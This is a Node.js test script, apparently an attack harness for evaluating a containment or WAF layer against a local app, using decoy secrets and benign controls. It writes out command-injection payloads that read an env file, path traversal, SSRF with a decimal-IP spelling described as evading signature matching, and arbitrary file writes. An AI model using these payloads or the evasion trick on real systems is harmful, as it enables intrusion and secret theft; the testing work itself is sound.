// Attacker for the Vorynex containment proof.
//
// Sends the pre-registered attack corpus at a target and records the EFFECT of
// each attempt, checked host-side where possible (marker file, leaked decoy,
// collector hits, written file) rather than trusting the HTTP response.
//
// Usage: node attacker.js <baseUrl> <out.jsonl>
// Env:   MARKER, LEAK_OUT, COLLECTOR_HITS, COLLECTOR_URL, INTERNAL_DECIMAL,
//        WRITE_TARGET, APP_WRITE, DECOY_ENV, TRAVERSAL_FILE
'use strict';

const fs = require('fs');
const http = require('http');
const path = require('path');

const BASE_URL = (process.argv[2] || 'http://127.0.0.1:3220').replace(/\/$/, '');
const OUT = process.argv[3] || '/tmp/proof-results.jsonl';

const MARKER = process.env.MARKER || '/tmp/vorynex-proof-marker';
const LEAK_OUT = process.env.LEAK_OUT || '/tmp/vorynex-proof-leak';
const COLLECTOR_HITS = process.env.COLLECTOR_HITS || '';
const COLLECTOR_URL = process.env.COLLECTOR_URL || 'http://127.0.0.1:9/probe';
// The same destination, written as a decimal IPv4 (127.0.0.1 -> 2130706433).
// Signature engines match the dotted form; getaddrinfo accepts this one.
const INTERNAL_DECIMAL = process.env.INTERNAL_DECIMAL || 'http://2130706433:9/probe';
const WRITE_TARGET = process.env.WRITE_TARGET || '/tmp/vorynex-proof-written';
const APP_WRITE = process.env.APP_WRITE || '/tmp/vorynex-proof-app-write';
const DECOY_ENV = process.env.DECOY_ENV || path.join(__dirname, 'fixtures', 'decoy.env');
const TRAVERSAL_FILE = process.env.TRAVERSAL_FILE || '../fixtures/decoy.env';
const DECOY_MARK = 'DECOY-VORYNEX-NOT-REAL';

function hits() {
  try {
    return fs.readFileSync(COLLECTOR_HITS, 'utf8').split('\n').filter(Boolean).length;
  } catch {
    return 0;
  }
}

function get(pathAndQuery) {
  return new Promise((resolve) => {
    const req = http.get(BASE_URL + pathAndQuery, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () =>
        resolve({
          status: res.statusCode,
          body,
          waf: res.headers['x-proof-waf'] || '',
          wafRule: res.headers['x-proof-waf-rule'] || '',
        })
      );
    });
    req.on('error', (e) => resolve({ status: 0, body: String(e.message), waf: '', wafRule: '' }));
    req.setTimeout(4000, () => req.destroy(new Error('timeout')));
  });
}

const q = (s) => encodeURIComponent(s);

async function run(name, request, effect) {
  const before = hits();
  let response = { status: 0, body: '' };
  try {
    response = await get(request);
  } catch (e) {
    response = { status: 0, body: String(e.message) };
  }
  const landed = Boolean(await effect({ response, before, after: hits() }));
  return {
    scenario: name,
    request,
    status: response.status,
    waf: response.waf || '',
    wafRule: response.wafRule || '',
    landed,
    evidence: String(response.body || '').slice(0, 300),
  };
}

async function main() {
  for (const f of [MARKER, LEAK_OUT, WRITE_TARGET, APP_WRITE]) {
    try { fs.unlinkSync(f); } catch { /* ignore */ }
  }

  const results = [];

  results.push(await run('cmd_marker', `/api/ping?host=${q(`127.0.0.1; touch ${MARKER}`)}`, async () => {
    try { return fs.existsSync(MARKER); } catch { return false; }
  }));

  results.push(await run('cmd_secret', `/api/ping?host=${q(`127.0.0.1; cat ${DECOY_ENV} > ${LEAK_OUT}`)}`, async () => {
    try { return fs.readFileSync(LEAK_OUT, 'utf8').includes(DECOY_MARK); } catch { return false; }
  }));

  results.push(await run('path_traversal', `/api/read?file=${q(TRAVERSAL_FILE)}`, async ({ response }) => {
    return String(response.body).includes(DECOY_MARK);
  }));

  // Same destination, two spellings. A signature engine can match the dotted
  // form; the decimal form reaches the same host.
  results.push(await run('ssrf_dotted', `/api/fetch?url=${q(COLLECTOR_URL)}`, async ({ after, before }) => {
    return after > before;
  }));
  results.push(await run('ssrf_decimal', `/api/fetch?url=${q(INTERNAL_DECIMAL)}`, async ({ after, before }) => {
    return after > before;
  }));

  // Persistence: write a file inside the application's own tree. There is no
  // payload signature for "this app must not write here" — the request looks
  // like a normal API call.
  results.push(await run('persistence_write', `/api/write?path=${q(APP_WRITE)}&data=webshell`, async () => {
    return fs.existsSync(APP_WRITE);
  }));

  results.push(await run('arbitrary_write', `/api/write?path=${q(WRITE_TARGET)}&data=pwned`, async () => {
    return fs.existsSync(WRITE_TARGET);
  }));

  // Benign controls: these must keep working in the protected arm.
  results.push(await run('benign_echo', '/api/echo?x=1', async ({ response }) => {
    return response.status === 200 && response.body.includes('"ok":true');
  }));
  results.push(await run('benign_read', '/api/read?file=server.js', async ({ response }) => {
    return response.status === 200 && response.body.includes('createServer');
  }));

  fs.writeFileSync(OUT, results.map((r) => JSON.stringify(r)).join('\n') + '\n');
  for (const r of results) {
    process.stdout.write(`${r.landed ? 'LANDED  ' : 'blocked '} ${r.scenario}\n`);
  }
}

main().catch((e) => {
  process.stderr.write(`attacker error: ${e && e.stack ? e.stack : e}\n`);
  process.exit(1);
});
